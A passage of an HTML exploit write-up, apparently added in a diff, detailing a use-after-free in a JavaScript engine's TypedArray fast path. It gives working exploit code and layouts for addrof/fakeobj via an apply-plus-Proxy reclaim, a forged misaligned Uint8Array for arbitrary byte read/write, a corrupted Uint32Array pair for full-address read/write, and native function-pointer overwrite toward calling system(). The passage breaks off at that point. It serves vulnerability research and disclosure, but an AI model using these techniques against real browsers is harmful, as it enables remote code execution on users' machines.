+<div class="note"><b>ASAN is blind to this.</b> The only code that ever dereferences the stale
+<code>m_data</code> is the hand-written asm fast path above, and AddressSanitizer can only
+instrument compiler-emitted memory accesses. Every C++ accessor
+(<code>TypedArrayPrototype</code> methods, <code>Atomics</code>, the slow-path helper)
+re-derives the data pointer via <code>viewed_array_buffer()-&gt;buffer().data()</code> and
+correctly reaches Z, so under the <code>Sanitizer</code> build <code>viewA[0]</code> just
+reads quarantine garbage with no report. The reclaim-and-compare in
+<code>bug1-minimal.html</code> (allocate a fresh <code>ArrayBuffer(131072)</code>, write a
+sentinel, read it back through <code>viewA</code>) is how you demonstrate the UAF without a
+debugger.</div>
+
+<!-- ==================================================================== -->
+<h2 id="s3">3. What the bug gives us, and the giant thing it doesn't</h2>
+
+<p>After two grows we have a 64&nbsp;KiB read/write window over a freed 128&nbsp;KiB
+mimalloc block. Call its address <b>X</b>. We can:</p>
+<ul>
+<li>read any 4 bytes in <code>[X, X+64K)</code> via <code>viewA[i]</code>;</li>
+<li>write any 4 bytes there via <code>viewA[i] = v|0</code>.</li>
+</ul>
+
+<p>We can <b>not</b>:</p>
+<ul>
+<li>read or write anywhere else;</li>
+<li><b>learn the value of X</b>. Nothing in JavaScript exposes a buffer's address.</li>
+</ul>
+
+<div class="analogy">It's a keyhole into a dark room. You can reach through and feel what's
+there, you can put things on the table, but you don't know the room number, and you can't
+reach the light switch on the far wall.</div>
+
+<p>The classic plan is: get the allocator to put something <em>interesting</em> on that
+table. Specifically, something that holds NaN-boxed JS values, so that the same 8 bytes
+mean "object pointer" to one accessor and "two u32s" to <code>viewA</code>. That overlap is
+addrof and fakeobj.</p>
+
+<!-- ==================================================================== -->
+<h2 id="s4">4. <span class="stage">Stage 1</span> addrof &amp; fakeobj: the <code>apply</code>+Proxy trick</h2>
+
+<h3>4.1 The first thing everyone tries (and why it fails here)</h3>
+
+<p>The textbook reclaim is a JS array's element storage: <code>[obj, obj, obj, …]</code>
+stores a contiguous <code>Value[]</code> on the malloc heap. Spray a few, one lands at X,
+and <code>viewA[2..3]</code> overlaps <code>spray[k][0]</code>.</p>
+
+<div class="deadend">It doesn't work, for an annoyingly mundane reason:
+<code>Object::grow_indexed_elements</code> grows by ×1.5 (8, 12, 18, 27, … 11623, 17434),
+and <code>allocate_indexed_elements(cap)</code> does <code>kmalloc(8 + cap*8)</code>. None
+of those sizes lands in mimalloc's 131072-byte bin. Jumping straight to a large index
+(<code>a[16382] = x</code>) trips the sparse-array threshold (200) and converts to a hash
+map instead. We tried half a dozen fill patterns; none produced a single 128 KiB
+<code>Value[]</code>. See <a href="#s9">§9</a> for the full graveyard.</div>
+
+<h3>4.2 What <em>does</em> allocate exactly 131072 bytes of <code>Value</code>s?</h3>
+
+<p>After grepping for every <code>ensure_capacity</code> on a <code>Vector&lt;Value&gt;</code>,
+one stood out:</p>
+
+<pre class="cpp"><code>// AbstractOperations.cpp, CreateListFromArrayLike
+auto length = TRY(length_of_array_like(vm, array_like));
+auto list = GC::RootVector&lt;Value&gt; { vm.heap() };
+list.ensure_capacity(length);                 // ← kmalloc(mi_good_size(length * 8))
+for (size_t i = 0; i &lt; length; ++i)
+    list.append(TRY(array_like.get(i)));       // ← user-visible callback per element!</code></pre>
+
+<p>This is the spec algorithm behind <code>Function.prototype.apply(thisArg, argArray)</code>
+when <code>argArray</code> isn't a fast packed array. With <code>length = 16384</code>,
+<code>ensure_capacity</code> does <em>one</em> <code>mi_malloc(131072)</code>, exactly our
+bin, and that block sits live on the C++ stack while the loop runs. And the loop calls back
+into <em>our</em> code on every iteration if <code>argArray</code> is a <code>Proxy</code>.</p>
+
+<div class="key">Make the freed block be reclaimed by something whose lifetime we are
+<em>inside of</em>. The Proxy <code>get</code> trap runs while the
+<code>Vector&lt;Value&gt;</code> backing is at X, and we still hold <code>viewA</code> at X.
+Same bytes, two interpretations, and a callback in the middle to exploit it.</div>
+
+<pre class="js"><code>const proxy = new Proxy({}, {
+  get(t, k) {
+    if (k === 'length') return 16384;             // forces 131072-byte Vector
+    let i = k|0;
+    if (i &gt;= 1 &amp;&amp; i &lt;= 4)                         // addrof: harvest what trap(i-1) stored
+      _leak[i-1] = viewA[(i-1)*2] | (viewA[(i-1)*2+1] &lt;&lt; 32);
+    if (i === 5 &amp;&amp; _do_abort) throw _abort;       // addrof mode: bail early (16379 traps saved)
+    if (i === 16383 &amp;&amp; _do_write) {               // fakeobj mode: plant on the LAST iteration
+      viewA[0] = _wlo; viewA[1] = _whi;
+    }
+    return (i &lt; 4) ? _slot[i] : 0;
+  }
+});
+function recv(){ _capture[0] = arguments[0]; }
+recv.apply(null, proxy);</code></pre>
+
+<p>Walked through linearly, <code>recv.apply(null, proxy)</code> does this:</p>
+<ol>
+<li>Engine reads <code>proxy.length</code> → our <code>get</code> trap runs with
+    <code>key='length'</code> → we return <code>16384</code>.</li>
+<li>Engine does <code>list.ensure_capacity(16384)</code> → one <code>malloc(131072)</code>
+    → mimalloc hands back <b>X</b> (the most-recently-freed 128&nbsp;K block).
+    <code>list</code>'s storage and <code>viewA.m_data</code> are now the same bytes.</li>
+<li>Engine reads <code>proxy[0]</code> → our trap runs with <code>key='0'</code> → we
+    return some value <code>v₀</code>. Engine writes the 8-byte NaN-boxed encoding of
+    <code>v₀</code> at <code>X+0</code>, i.e. at <code>viewA[0..1]</code>.</li>
+<li>Engine reads <code>proxy[1]</code> → our trap runs. <em>Before</em> returning, we can
+    look at <code>viewA[0..1]</code> and see the raw bytes of <code>v₀</code> the engine
+    just stored. We can also <em>overwrite</em> any earlier <code>viewA[..]</code> slot,
+    which retroactively edits <code>list[..]</code>.</li>
+<li>&hellip;repeat through <code>proxy[16383]</code>&hellip;</li>
+<li>Engine calls <code>recv(list[0], list[1], &hellip;, list[16383])</code>. Inside
+    <code>recv</code>, <code>arguments[k]</code> is whatever <code>list[k]</code> ended up
+    as after step 5, including anything we overwrote.</li>
+</ol>
+
+<p><b><code>addrof(obj)</code></b> is steps 3-4 with <code>v₀ = obj</code>: at trap 0 return
+<code>obj</code>; at trap 1 read <code>viewA[0..1]</code>, mask off the <code>0xFFF9</code>
+tag, that's the address; throw to bail out of the remaining 16382 iterations.</p>
+
+<p><b><code>fakeobj(addr)</code></b> is steps 3-6: return <code>0</code> at every trap so
+<code>list[..]</code> stays full of harmless <code>INT32(0)</code>s, and at trap 16383 write
+<code>viewA[0] = addr&nbsp;&amp;&nbsp;0xFFFFFFFF</code>, <code>viewA[1] = 0xFFF90000 |
+(addr&nbsp;&gt;&gt;&nbsp;32)</code>. That edits <code>list[0]</code> in place to an
+OBJECT-tagged <code>Value</code> pointing at <code>addr</code>. The loop ends, <code>recv</code>
+runs, <code>arguments[0]</code> is a live JS reference the engine believes is the object at
+<code>addr</code>, and <code>recv</code> stashes it in a global.</p>
+
+<svg viewBox="0 0 800 280">
+  <style>.s{font-size:10px}</style>
+  <rect x="40" y="20" width="720" height="40" rx="4" fill="#f5b7b1" stroke="#922b21"/>
+  <text x="400" y="36" text-anchor="middle" class="s" font-weight="bold">freed 128 KiB block @ X (mimalloc large bin)</text>
+  <text x="400" y="50" text-anchor="middle" class="s">…now reclaimed as RootVector&lt;Value&gt; backing for the duration of apply()…</text>
+
+  <!-- two accessors -->
+  <rect x="40" y="100" width="350" height="60" rx="4" fill="#aed6f1" stroke="#1a5276"/>
+  <text x="215" y="118" text-anchor="middle" class="s" font-weight="bold">viewA (stale Uint32Array)</text>
+  <text x="215" y="134" text-anchor="middle" class="s">viewA[0..1] = raw lo/hi u32 of qword at X+0</text>
+  <text x="215" y="148" text-anchor="middle" class="s">read → addrof &nbsp;·&nbsp; write → plant fakeobj</text>
+
+  <rect x="410" y="100" width="350" height="60" rx="4" fill="#d5f5e3" stroke="#1e8449"/>
+  <text x="585" y="118" text-anchor="middle" class="s" font-weight="bold">create_list_from_array_like loop</text>
+  <text x="585" y="134" text-anchor="middle" class="s">trap(i) returns v → list[i] = NaN-boxed(v) at X+i·8</text>
+  <text x="585" y="148" text-anchor="middle" class="s">recv(...args) sees args[i] = list[i]</text>
+
+  <line x1="215" y1="100" x2="215" y2="60" stroke="#1a5276" stroke-width="2" marker-end="url(#a2)"/>
+  <line x1="585" y1="100" x2="585" y2="60" stroke="#1e8449" stroke-width="2" marker-end="url(#a2)"/>
+
+  <text x="40" y="200" class="s"><tspan font-weight="bold">addrof(obj):</tspan> trap(0) returns obj → list[0] = 0xFFF9_0000_&lt;addr&gt; at X+0.</text>
+  <text x="40" y="214" class="s">             trap(1) reads viewA[0..1] → low 48 bits = address. Done.</text>
+  <text x="40" y="236" class="s"><tspan font-weight="bold">fakeobj(addr):</tspan> trap(16383) does viewA[0]=lo(addr), viewA[1]=0xFFF90000|hi(addr).</text>
+  <text x="40" y="250" class="s">              loop ends, recv() runs, arguments[0] is now a JS reference to "the object at addr".</text>
+</svg>
+
+<h3>4.3 Why "the LAST iteration" matters: a GC near-miss</h3>
+
+<p>The <code>RootVector</code> is registered as a GC root. If GC runs during the loop -
+and 16384 Proxy callbacks allocate plenty, it will scan every <code>Value</code> in the
+vector. A forged object pointer to a misaligned address would be visited, its "vtable"
+dereferenced, and we'd crash before even getting started. So we leave <code>list[0]</code>
+as a harmless integer until iteration 16383, plant the forged value, and let the loop end.
+Between the write and <code>recv()</code> there are no allocations, hence no GC.</p>
+
+<h3>4.4 Reliability gotcha #1: did the Vector actually land at X?</h3>
+
+<p>mimalloc reuses the most-recently-freed large page first, so the Vector <em>usually</em>
+lands at X. But any stray 128&nbsp;KiB allocation between the <code>grow(100)</code> and the
+<code>apply</code> steals the slot. Two things caused that in practice:</p>
+
+<ol>
+<li><b>Our own spray.</b> Building the array of candidate <code>{}</code> pairs (see §5)
+    after the UAF made the holding array's element storage grow through the 128&nbsp;KiB
+    bin. <em>Fix:</em> do every up-front allocation, spray, helper buffers, even a warm-up
+    <code>apply</code>, <b>before</b> triggering the UAF.</li>
+<li><b>The script's own bytecode.</b> When stage-2 code was added to the same
+    <code>&lt;script&gt;</code>, the top-level <code>Executable</code>'s constant pool
+    crossed into the 128&nbsp;KiB bin and X was gone before we ever called
+    <code>apply</code>. <em>Fix:</em> put stage&nbsp;2 in a second
+    <code>&lt;script&gt;</code> tag, compiled only after stage&nbsp;1 has finished.</li>
+</ol>
+
+<p>And a belt-and-suspenders check: at trap index 1, <code>list[0]</code> has just been
+stored. If the Vector is at X, <code>viewA[1]</code> must equal
+<code>0x7FFA0000</code> (the high half of <code>INT32_TAG</code> for the <code>0</code> we
+returned). If it doesn't, throw, free the Vector, and retry, up to 32 times.</p>
+
+<div class="note">A subtle bug cost an hour here: the retry loop checked <code>typeof f ===
+'object'</code>. But the forged "flags" byte (see §5) sometimes has bit 7
+(<code>IsFunction</code>) set, so <code>typeof</code> returned <code>"function"</code> and
+we kept retrying a perfectly good fake. The fix is to check <code>f !== 0</code>, strict
+equality between an object-tagged value and a number is always false, no field reads
+needed.</div>
+
+<!-- ==================================================================== -->
+<h2 id="s5">5. <span class="stage">Stage 2</span> 1-byte arbitrary read/write: forging a misaligned TypedArray</h2>
+
+<h3>5.1 The chicken-and-egg problem</h3>
+
+<p>We have addrof (object → address) and fakeobj (address → object). The obvious next step
+is to forge a <code>Uint8Array</code> whose <code>m_data</code> field points wherever we
+like. But a forged object's <em>body</em> has to live at an address we know, and the only
+memory we can write to is at X, <b>whose value we don't know.</b></p>
+
+<div class="deadend">Every "just leak X" idea failed:
+<ul style="margin:.3em 0">
+<li>Free-list pointer at <code>X+0</code>? mimalloc large pages are one-block-per-page; the
+    "next" pointer is always NULL.</li>
+<li>Put another 128 K block in the same page and read its address from X's free-list link?
+    Same reason, there is no same-page neighbour.</li>
+<li>Read <code>viewA.m_data</code> (which <em>is</em> X) at <code>addrof(viewA)+104</code>?
+    That requires arbitrary read, which is what we're trying to build.</li>
+</ul>
+This circularity is the central puzzle of the exploit.</div>
+
+<h3>5.2 Breaking the cycle: don't write the fake, <em>find</em> it</h3>
+
+<p>Instead of writing a fake object body into memory we control, we point
+<code>fakeobj()</code> at memory that <em>already</em> contains the right bytes, by
+accident of layout. We need four specific values at four specific offsets from some
+address. We have <code>addrof</code>, so we know exactly where every GC object lives, byte
+for byte.</p>
+
+<div class="analogy">It's like a ransom note. You don't own a printing press, but you have
+a stack of newspapers (the GC heap) and you know exactly what's printed where
+(<code>addrof</code>). You just need to find a spot where the existing letters happen to
+spell what you need.</div>
+
+<p>The newspapers are plain <code>{}</code> objects: 64-byte cells, allocated contiguously
+when you create them in a tight loop. The only bytes we can <em>choose</em> are the two
+inline property slots at +48 and +56. Everything else is fixed by the engine. So the
+question becomes: is there an offset <code>Δ</code> such that
+<code>fakeobj(addrof(holder)+Δ)</code> makes the four typed-array fields land on bytes
+that are either (a) already a useful constant, or (b) one of those two controllable
+slots?</p>
+
+<p>After tabulating a dozen candidate <code>Δ</code> values, <b>Δ = 16</b> works, using
+<em>two</em> adjacent cells:</p>
+
+<svg viewBox="0 0 820 420">
+ <defs><marker id="a3" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#c0392b"/></marker></defs>
+ <style>.f{font-size:10px}.b{font-weight:bold}</style>
+
+ <!-- holder cell -->
+ <text x="20" y="18" class="f b">holder @ H (64-byte Object cell)</text>
+ <g transform="translate(20,24)">
+  <rect x="0" y="0" width="780" height="26" fill="none" stroke="#888"/>
+  <rect x="0"   y="0" width="80"  height="26" fill="#eee"/><text x="40"  y="17" text-anchor="middle" class="f">vtable</text>
+  <rect x="80"  y="0" width="20"  height="26" fill="#eee"/><text x="90"  y="17" text-anchor="middle" class="f">hdr</text>
+  <rect x="100" y="0" width="10"  height="26" fill="#fdebd0"/><text x="105" y="17" text-anchor="middle" class="f">f</text>
+  <rect x="110" y="0" width="10"  height="26" fill="#eee"/>
+  <rect x="120" y="0" width="40"  height="26" fill="#eee"/><text x="140" y="17" text-anchor="middle" class="f">size</text>
+  <rect x="160" y="0" width="80"  height="26" fill="#eee"/><text x="200" y="17" text-anchor="middle" class="f">shape</text>
+  <rect x="240" y="0" width="80"  height="26" fill="#d6eaf8"/><text x="280" y="17" text-anchor="middle" class="f">named* = H+48</text>
+  <rect x="320" y="0" width="80"  height="26" fill="#eee"/><text x="360" y="17" text-anchor="middle" class="f">indexed*</text>
+  <rect x="400" y="0" width="80"  height="26" fill="#eee"/><text x="440" y="17" text-anchor="middle" class="f">private*=0</text>
+  <rect x="480" y="0" width="80"  height="26" fill="#d5f5e3"/><text x="520" y="17" text-anchor="middle" class="f">inline[0]</text>
+  <rect x="560" y="0" width="80"  height="26" fill="#d5f5e3"/><text x="600" y="17" text-anchor="middle" class="f">inline[1]</text>
+  <text x="0"   y="38" class="f">+0</text><text x="100" y="38" class="f">+10</text>
+  <text x="240" y="38" class="f">+24</text><text x="480" y="38" class="f">+48</text><text x="560" y="38" class="f">+56</text>
+ </g>
+
+ <!-- next cell -->
+ <text x="20" y="92" class="f b">next @ H+64 (the very next Object cell; next.a, next.b set from JS)</text>
+ <g transform="translate(20,98)">
+  <rect x="0" y="0" width="780" height="26" fill="none" stroke="#888"/>
+  <rect x="0"   y="0" width="80"  height="26" fill="#eee"/><text x="40"  y="17" text-anchor="middle" class="f">vtable</text>
+  <rect x="80"  y="0" width="20"  height="26" fill="#eee"/>
+  <rect x="100" y="0" width="10"  height="26" fill="#eee"/>
+  <rect x="110" y="0" width="10"  height="26" fill="#eee"/>
+  <rect x="120" y="0" width="40"  height="26" fill="#eee"/>
+  <rect x="160" y="0" width="80"  height="26" fill="#d6eaf8"/><text x="200" y="17" text-anchor="middle" class="f">shape</text>
+  <rect x="240" y="0" width="80"  height="26" fill="#eee"/>
+  <rect x="320" y="0" width="80"  height="26" fill="#eee"/>
+  <rect x="400" y="0" width="80"  height="26" fill="#d6eaf8"/><text x="440" y="17" text-anchor="middle" class="f">private*=0</text>
+  <rect x="480" y="0" width="80"  height="26" fill="#d5f5e3"/><text x="520" y="17" text-anchor="middle" class="f">next.a</text>
+  <rect x="560" y="0" width="80"  height="26" fill="#abebc6"/><text x="600" y="17" text-anchor="middle" class="f b">next.b</text>
+  <text x="160" y="38" class="f">+16</text><text x="400" y="38" class="f">+40</text><text x="560" y="38" class="f">+56</text>
+ </g>
+
+ <!-- fake overlay -->
+ <text x="20" y="172" class="f b" fill="#c0392b">fake "Uint8Array" @ H+16, what the asm fast path reads:</text>
+ <g transform="translate(20,180)">
+  <rect x="0" y="0" width="780" height="34" fill="none" stroke="#c0392b" stroke-width="2" stroke-dasharray="5"/>
+  <line x1="100" y1="-154" x2="20" y2="0" stroke="#c0392b" stroke-dasharray="3"/>
+  <line x1="640" y1="-80"  x2="760" y2="0" stroke="#c0392b" stroke-dasharray="3"/>
+
+  <!-- field markers -->
+  <g class="f">
+   <line x1="86" y1="34" x2="86" y2="50" stroke="#c0392b" marker-end="url(#a3)"/>
+   <text x="86" y="64" text-anchor="middle"><tspan class="b">+10 flags</tspan></text>
+   <text x="86" y="76" text-anchor="middle">= byte 2 of (H+48)</text>
+   <text x="86" y="88" text-anchor="middle">need bit 3 set</text>
+
+   <line x1="380" y1="34" x2="380" y2="50" stroke="#c0392b" marker-end="url(#a3)"/>
+   <text x="380" y="64" text-anchor="middle"><tspan class="b">+68 array_length</tspan></text>
+   <text x="380" y="76" text-anchor="middle">= bytes 4-7 of next.shape</text>
+   <text x="380" y="88" text-anchor="middle">GC ptrs ≈ 0x1_4XXX_XXXX → = 1</text>
+
+   <line x1="540" y1="34" x2="540" y2="50" stroke="#c0392b" marker-end="url(#a3)"/>
+   <text x="540" y="64" text-anchor="middle"><tspan class="b">+92 kind</tspan></text>
+   <text x="540" y="76" text-anchor="middle">= byte 4 of next.private*</text>
+   <text x="540" y="88" text-anchor="middle">null → 0 = Uint8Array</text>
+
+   <line x1="700" y1="34" x2="700" y2="50" stroke="#c0392b" marker-end="url(#a3)"/>
+   <text x="700" y="64" text-anchor="middle" class="b" fill="#1e8449">+104 m_data</text>
+   <text x="700" y="76" text-anchor="middle" fill="#1e8449">= next.inline[1]</text>
+   <text x="700" y="88" text-anchor="middle" fill="#1e8449" class="b">= next.b ← we set this!</text>
+  </g>
+ </g>
+
+ <text x="20" y="310" class="f">The asm fast path re-reads <tspan class="b">m_data</tspan> from the cell on <tspan class="b">every</tspan> access. So:</text>
+ <rect x="40" y="320" width="740" height="56" rx="4" fill="#e8f8f5" stroke="#1e8449"/>
+ <text x="60" y="340" class="f"><tspan class="b">next.b = bitsToDouble(addr);</tspan>   // store target address as a denormal double in next's inline slot</text>
+ <text x="60" y="356" class="f"><tspan class="b">fake[0]</tspan>                          // = *(u8*)addr  , one byte, anywhere in the 48-bit address space</text>
+ <text x="60" y="372" class="f"><tspan class="b">fake[0] = v</tspan>                      // *(u8*)addr = v</text>
+</svg>
+
+<p>Three of the four fields fall on bytes that are <em>incidentally</em> correct for any
+plain object on this platform. The fourth (the one that matters) falls on a slot we set
+from JavaScript. The fast path's only bound check is <code>index &lt; array_length</code>;
+with length forced to 1, <code>fake[0]</code> is the only legal index, but that's all we
+need.</p>
+
+<h4>Why not just put the fake body in inline properties?</h4>
+
+<p>The obvious alternative is to start the fake right at the inline storage
+(<code>fakeobj(H+48)</code>) so the first 16 bytes are bytes we set. It doesn't work, and
+seeing why is instructive. A plain <code>{}</code> has exactly two 8-byte inline slots at
+<code>+48</code> and <code>+56</code>; everything else in the 64-byte cell is
+engine-managed. The four fast-path reads sit at <code>{+10, +68, +92, +104}</code>, which
+modulo 64 is <code>{10, 4, 28, 40}</code>. For a read to land on an inline slot it needs
+<code>(Δ + offset) mod 64 ∈ [48,&nbsp;64)</code>. No single Δ puts more than two of the
+four into that window, so at least two fields will always land on bytes you don't control.
+The question is then which two, and whether the uncontrolled ones happen to be useful
+constants.</p>
+
+<table class="layout" style="font-size:0.85em">
+<tr><th>Δ</th><th>flags @+10</th><th>length @+68</th><th>kind @+92</th><th>m_data @+104</th><th>verdict</th></tr>
+<tr><td>48</td>
+    <td class="ctrl">cell0+58 = <code>cell0.b</code> ✓</td>
+    <td class="ctrl">cell1+52 = <code>cell1.a</code> ✓</td>
+    <td>cell2+12 = array-like-size</td>
+    <td>cell2+24 = <code>m_named_properties</code> (self-ptr, fixed)</td>
+    <td>m_data not retargetable ✗</td></tr>
+<tr><td>20-23</td>
+    <td>cell0+30..33 = high bytes of self-ptr / null = 0</td>
+    <td>cell1+24..27</td>
+    <td class="ctrl">cell1+48..51 = <code>cell1.a</code> ✓</td>
+    <td class="ctrl">cell1+60..63 = <code>cell1.b</code> ✓</td>
+    <td>flags always 0 → not "TypedArray" ✗</td></tr>
+<tr><td><b>16</b></td>
+    <td>cell0+26 = bit 19 of H (~50%)</td>
+    <td>cell1+20 = high u32 of GC ptr = <b>1</b></td>
+    <td>cell1+44 = byte 4 of null = <b>0</b></td>
+    <td class="ctrl">cell1+56 = <code>cell1.b</code> ✓</td>
+    <td><b>only Δ where m_data is controllable AND the rest are usable constants</b></td></tr>
+</table>
+
+<p>Δ=48 gives you controllable flags and length but a fixed <code>m_data</code> (you'd
+read/write one address forever). Δ in [20,24) gives controllable <code>kind</code> and
+<code>m_data</code> but a guaranteed-zero flags byte, so the fast path never even takes the
+typed-array branch. Δ=16 is the only offset where <code>m_data</code> hits an inline slot
+and the three uncontrolled fields all happen to read as workable constants. The same
+exhaustive table is why a small <code>ArrayBuffer</code>'s 32-byte inline storage doesn't
+help either: 32 contiguous controllable bytes still can't cover a 95-byte field span.</p>
+
+<h4>Why one byte and not four or eight?</h4>
+
+<p>Because <code>kind</code> is one of the uncontrolled fields. At Δ=16 it lands on byte 4
+of <code>next.m_private_elements</code>, which is <code>nullptr</code> for any plain
+<code>{}</code>, so <code>kind</code> reads <code>0</code>, and
+<code>0&nbsp;=&nbsp;TYPED_ARRAY_KIND_UINT8</code>. The fast path dispatches on
+<code>kind</code> to pick the load/store width, so <code>fake[0]</code> compiles to
+<code>ldrb</code>/<code>strb</code>. Getting <code>kind&nbsp;=&nbsp;3</code>
+(<code>Uint32</code>) or <code>11</code> (<code>Float64</code>) would need a Δ that puts
+<code>+92</code> on an inline slot, and as the table shows, every such Δ kills the flags
+check. So you take the 1-byte primitive and immediately spend ~24 of those byte-writes
+corrupting two real <code>Uint32Array</code>s into the clean 4-byte primitive of §6.</p>
+
+<h3>5.3 The one constraint we can't paper over</h3>
+
+<p>The flags byte at <code>fake+10</code> is byte 2 of the value <code>H+48</code>, i.e.
+bits 16-23 of the holder's own address (plus 48). Bit 3 of that byte
+(<code>IsTypedArray</code>) must be 1, which means <b>bit 19 of the holder's address must
+be 1</b>. We don't get to choose addresses; ASLR does.</p>
+
+<p>HeapBlocks are 16&nbsp;KiB and individually <code>mmap</code>'d, so each block's base
+address has an independent ~50% chance of satisfying this. We spray 4096
+<code>{holder, next}</code> pairs (≈32 blocks), <code>addrof</code> each pair to check
+adjacency (<code>N − H == 64</code>) and the bit-19 condition, and pick the first
+winner.</p>
+
+<div class="deadend">First attempt sprayed the pairs <em>after</em> the UAF and stored them
+with <code>pairs.push(h, n)</code>, and the <code>pairs</code> array's own element storage
+grew through the 128 KiB bin and ate X. Second attempt sprayed too few pairs, all in one
+HeapBlock, bit 19 was 0 for the whole block, "no suitable pair." Both fixed by spraying
+4096 pairs <em>before</em> the UAF into a pre-sized container.</div>
+
+<h3>5.4 Why this primitive is radioactive</h3>
+
+<p><code>fake</code> is an object-tagged JS value pointing at <code>H+16</code>, the
+<em>middle</em> of a GC cell. If the garbage collector ever visits it, it will treat
+<code>H+16</code> as a cell, read the "vtable" (actually <code>holder.m_shape</code>), and
+call through it. Crash.</p>
+
+<p>The GC scans every <code>Value</code> in every live object and every interpreter stack
+slot. The moment <code>fake</code> lands in any of those, the next allocation that triggers
+GC kills us. So the rule is: between materialising <code>fake</code> and dropping it, <b>do
+not allocate</b>. No string concatenation, no <code>BigInt</code> arithmetic, nothing. Every
+address we'll need is computed <em>first</em>, stored as plain int32 lo/hi pairs, and the
+fake is used in a tight allocation-free burst:</p>
+
+<pre class="js"><code>// BEFORE creating fake: compute everything that needs addrof/BigInt
+let R1 = addrof(rw1), R2 = addrof(rw2), V = addrof(viewA);
+let R1lo = lo32(R1), R1hi = hi32(R1), ...;
+
+let fake = fakeobj(Haddr + 16n);        // ← from here on, NO ALLOCATIONS
+function fw8(lo,hi,off,v){              //   one-byte write helper:
+  next_cell.b = bitsToDouble(lo+off, hi);  //   PutById on existing prop → IC hit, no alloc
+  fake[0] = v|0;                           //   PutByValue typed-array fast path, no alloc
+}
+fw8(R1lo,R1hi, 68, 0xFF); ...           //   patch rw1 / rw2 (next section)
+fake = null; next_cell.b = 0;           // ← safe again</code></pre>
+
+<!-- ==================================================================== -->
+<h2 id="s6">6. <span class="stage">Stage 3</span> Stable, full-range read/write</h2>
+
+<p>The 1-byte primitive works at any address but is fragile (GC-unsafe) and slow (one byte,
+retarget, repeat). We use it exactly once, to corrupt two <em>real</em>
+<code>Uint32Array</code>s into a self-retargeting pair:</p>
+
+<svg viewBox="0 0 760 200">
+ <defs><marker id="a4" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#2471a3"/></marker></defs>
+ <rect x="40" y="30" width="280" height="70" rx="6" fill="#aed6f1" stroke="#1a5276"/>
+ <text x="180" y="48" text-anchor="middle" font-size="11" font-weight="bold">rw1 : Uint32Array (real GC cell)</text>
+ <text x="180" y="64" text-anchor="middle" font-size="10">m_array_length ← 0x7FFFFFFF</text>
+ <text x="180" y="78" text-anchor="middle" font-size="10">m_data ← addrof(rw2)</text>
+
+ <rect x="440" y="30" width="280" height="70" rx="6" fill="#aed6f1" stroke="#1a5276"/>
+ <text x="580" y="48" text-anchor="middle" font-size="11" font-weight="bold">rw2 : Uint32Array (real GC cell)</text>
+ <text x="580" y="64" text-anchor="middle" font-size="10">m_array_length ← 0x7FFFFFFF</text>
+ <text x="580" y="78" text-anchor="middle" font-size="10" fill="#c0392b">m_data ← (set per access via rw1)</text>
+
+ <path d="M 320 65 Q 380 65 440 65" stroke="#2471a3" stroke-width="2" fill="none" marker-end="url(#a4)"/>
+ <text x="380" y="58" text-anchor="middle" font-size="10">rw1[i] writes</text>
+ <text x="380" y="70" text-anchor="middle" font-size="10">into rw2's cell</text>
+
+ <text x="40" y="135" font-size="11"><tspan font-weight="bold">r32(addr):</tspan>  rw1[26]=lo(addr); rw1[27]=hi(addr);  /* writes rw2+104 = rw2.m_data */  return rw2[0];</text>
+ <text x="40" y="153" font-size="11"><tspan font-weight="bold">w32(addr,v):</tspan> rw1[26]=lo(addr); rw1[27]=hi(addr);  rw2[0]=v|0;</text>
+ <text x="40" y="175" font-size="10" fill="#666">Both arrays are genuine TypedArrays with valid vtables and m_viewed_array_buffer, GC can visit them all day.</text>
+</svg>
+
+<div class="deadend">The first attempt set <code>rw.m_data = 4</code> with a huge length,
+so <code>rw[addr/4]</code> would index from near-zero. That covers 8 GiB, enough for the
+GC heap (≈0x14X_XXXX_XXX) and code (≈0x10X_XXX_XXX), but the <code>VM</code> object lives
+at ≈0xB_XXXX_XXXX and wasm memory at ≈0x5E9_XXXX_XXXX, both out of reach. The two-array
+trampoline costs nothing extra and reaches the full 48-bit space.</div>
+
+<p>Sanity check (and our first real "we own the process" moment):</p>
+
+<pre class="out"><code>viewA vtable = 0x10597e330
+viewA.m_data = 0x2aaa0bb0000
+r64(addrof(viewA))     = 0x10597e330   ✓ matches
+r64(addrof(viewA)+104) = 0x2aaa0bb0000 ✓ matches  ← and there's X, finally</code></pre>
+
+<!-- ==================================================================== -->
+<h2 id="s7">7. <span class="stage">Stage 4</span> Calling native code</h2>
+
+<h3>7.1 Where to find a function pointer to overwrite</h3>
+
+<p>Every built-in like <code>Array.isArray</code> or <code>parseInt</code> is a
+<code>RawNativeFunction</code>, a GC cell with a plain C function pointer at offset
+96:</p>
+
+<pre class="cpp"><code>class RawNativeFunction final : public NativeFunction {
+    NativeFunctionPointer m_native_function;   // ThrowCompletionOr&lt;Value&gt; (*)(VM&amp;)
+};                                             // at cell+96</code></pre>
+
+<p>And the asm <code>Call</code> handler, when it sees the
+<code>IsFunction|IsRawNativeFunction</code> flag combination, sets up a frame and does
+exactly this:</p>
+
+<pre class="asm"><code>.enter_raw_native:
+    ldr  x3, [x3, #96]      ; m_native_function
+    mov  x9, x3
+    mov  x0, x20            ; x20 is the pinned VM* register
+    blr  x9                 ; call it
+    and  x1, x1, #0xff      ; ThrowCompletionOr discriminator: 0 = value, 1 = threw
+    cbnz x1, .exception</code></pre>
+
+<p>So <code>w64(addrof(Array.isArray)+96, anything)</code> followed by
+<code>Array.isArray(0)</code> calls <code>anything(VM*)</code> with no PAC, no CFI, no
+vtable check. (The build is plain <code>arm64</code>, not <code>arm64e</code>.)</p>
+
+<div class="note">We use <code>Array.isArray</code> rather than <code>Math.abs</code>
+because <code>Math.abs</code> is in the interpreter's "known builtin" list and may be
+compiled to a dedicated <code>CallBuiltin</code> opcode that bypasses
+<code>m_native_function</code> entirely.</div>
+
+<h3>7.2 The argument problem</h3>
+
+<p>The catch: <code>x0</code> is hard-wired to <code>VM*</code>. We don't get to pass a
+buffer. Three options were considered:</p>
+
+<ol>
+<li><b>Find a JOP gadget</b> that loads <code>x0</code> from one of the other live registers
+    (<code>x5</code> = last argument, <code>x6</code> = args array) and chains to a second
+    target. A scan of liblagom-js found <code>mov x0, x5; bl &lt;fixed&gt;</code> and
+    <code>mov x0, x5; ldp x29,x30,[sp]; ret</code>, neither chains to a controllable
+    target.</li>
+<li><b>Call <code>system(VM*)</code></b> after writing the command string at
